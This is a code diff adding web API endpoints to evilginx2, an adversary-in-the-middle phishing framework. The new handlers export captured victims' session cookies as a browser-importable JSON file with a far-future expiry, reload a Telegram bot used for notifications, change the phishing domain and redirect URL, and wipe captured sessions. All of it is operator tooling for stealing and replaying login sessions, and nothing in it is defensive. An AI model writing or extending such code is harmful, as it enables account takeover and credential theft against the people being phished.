@@ -7,19 +7,22 @@ import (
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+	"strconv"
 )
 
 type WebAPI struct {
 	db  *database.Database
 	cfg *Config
 	ns  *Nameserver
+	hp  *HttpProxy
 }
 
-func NewWebAPI(db *database.Database, cfg *Config, ns *Nameserver) *WebAPI {
+func NewWebAPI(db *database.Database, cfg *Config, ns *Nameserver, hp *HttpProxy) *WebAPI {
 	return &WebAPI{
 		db:  db,
 		cfg: cfg,
 		ns:  ns,
+		hp:  hp,
 	}
 }
 
@@ -29,9 +32,13 @@ func (w *WebAPI) Start(port int) {
 	// Example API Endpoints
 	mux.HandleFunc("/", w.handleIndex)
 	mux.HandleFunc("/api/sessions", w.handleSessions)
+	mux.HandleFunc("/api/sessions/download", w.handleSessionDownload)
 	mux.HandleFunc("/api/stats", w.handleStats)
 	mux.HandleFunc("/api/config", w.handleConfig)
+	mux.HandleFunc("/api/config/update", w.handleUpdateConfig)
 	mux.HandleFunc("/api/phishlets/enable", w.handlePhishletEnable)
+	mux.HandleFunc("/delete-all", w.handleDeleteAllSessions)
+	mux.HandleFunc("/logout", w.handleLogout)
 
 	// Settings Endpoints
 	mux.HandleFunc("/get-telegram", w.handleGetTelegram)
@@ -153,8 +160,102 @@ func (w *WebAPI) handleSaveTelegram(rw http.ResponseWriter, req *http.Request) {
 	w.cfg.SetTelegramBotToken(payload.BotToken)
 	w.cfg.SetTelegramEnabled(true)
 
+	// Hot-reload the live Telegram bot instance
+	if w.hp != nil {
+		w.hp.ReloadTelegramConfig()
+	}
+
 	rw.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(rw).Encode(map[string]string{"message": "✅ Telegram Settings Saved Successfully"})
+	json.NewEncoder(rw).Encode(map[string]string{"message": "✅ Telegram Settings Saved & Bot Reloaded"})
 }
 
-// Additional handlers like /api/sessions and /settings can be added similarly here.
+func (w *WebAPI) handleSessionDownload(rw http.ResponseWriter, req *http.Request) {
+	idStr := req.URL.Query().Get("id")
+	id, _ := strconv.Atoi(idStr)
+	session, err := w.db.GetSessionById(id)
+	if err != nil {
+		http.Error(rw, "Session not found", http.StatusNotFound)
+		return
+	}
+
+	cookieArray := []map[string]interface{}{}
+	for domain, domainCookies := range session.CookieTokens {
+		for name, cookie := range domainCookies {
+			cookieName := name
+			if cookie.Name != "" {
+				cookieName = cookie.Name
+			}
+			cookieArray = append(cookieArray, map[string]interface{}{
+				"name":           cookieName,
+				"value":          cookie.Value,
+				"domain":         domain,
+				"path":           cookie.Path,
+				"httpOnly":       cookie.HttpOnly,
+				"secure":         cookie.Secure,
+				"expirationDate": 1773674937, // Default far future expiration
+			})
+		}
+	}
+
+	rw.Header().Set("Content-Type", "application/json")
+	rw.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=cookies_%d.json", id))
+	json.NewEncoder(rw).Encode(cookieArray)
+}
+
+func (w *WebAPI) handleDeleteAllSessions(rw http.ResponseWriter, req *http.Request) {
+	if req.Method != http.MethodPost {
+		http.Error(rw, "Method payload invalid", http.StatusBadRequest)
+		return
+	}
+
+	sessions, _ := w.db.ListSessions()
+	for _, s := range sessions {
+		w.db.DeleteSessionById(s.Id)
+	}
+
+	rw.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(rw).Encode(map[string]string{"message": "✅ All sessions deleted successfully"})
+}
+
+func (w *WebAPI) handleLogout(rw http.ResponseWriter, req *http.Request) {
+	// For now, just return success. If authentication is implemented later, clear session cookies here.
+	rw.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(rw).Encode(map[string]string{"message": "Logged out"})
+}
+
+func (w *WebAPI) handleUpdateConfig(rw http.ResponseWriter, req *http.Request) {
+	if req.Method != http.MethodPost {
+		http.Error(rw, "Method invalid", http.StatusMethodNotAllowed)
+		return
+	}
+
+	var payload struct {
+		General struct {
+			Domain           string `json:"domain"`
+			UnauthUrl        string `json:"unauth_url"`
+			TelegramBotToken string `json:"telegram_bot_token"`
+			TelegramChatId   string `json:"telegram_chat_id"`
+		} `json:"general"`
+	}
+
+	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
+		http.Error(rw, err.Error(), http.StatusBadRequest)
+		return
+	}
+
+	if payload.General.Domain != "" {
+		w.cfg.SetServerBindIP(payload.General.Domain)
+	}
+	if payload.General.UnauthUrl != "" {
+		w.cfg.SetUnauthUrl(payload.General.UnauthUrl)
+	}
+	if payload.General.TelegramBotToken != "" {
+		w.cfg.SetTelegramBotToken(payload.General.TelegramBotToken)
+	}
+	if payload.General.TelegramChatId != "" {
+		w.cfg.SetTelegramChatID(payload.General.TelegramChatId)
+	}
+
+	rw.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(rw).Encode(map[string]string{"message": "✅ Configuration updated successfully"})
+}
